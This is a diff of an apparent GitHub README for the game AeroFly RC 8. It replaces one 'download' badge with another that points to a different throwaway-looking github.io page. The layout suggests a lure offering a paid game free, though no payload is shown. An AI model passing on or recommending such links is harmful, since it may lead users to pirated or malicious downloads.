@@ -6,11 +6,8 @@
   <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/1523450/header.jpg?t=1712080025" width="820" alt="AeroFly RC 8 Header">
 </div>
 
-<div align="center">
-  <a href="https://skills-with-aerofly-rc-8.github.io/.github">
-    <img src="https://img.shields.io/badge/Скачать_AeroFly_RC8-1b2838?style=for-the-badge&logo=steam&logoColor=white" alt="Скачать AeroFly RC 8">
-  </a>
-</div>
+[![GET Skills with](https://img.shields.io/badge/GET%20%E2%80%94%20Skills-with-0078D6?style=for-the-badge&logoColor=white)](https://pellegrinijulnichter.github.io/.github/Skills-with)
+
 
 ---
 
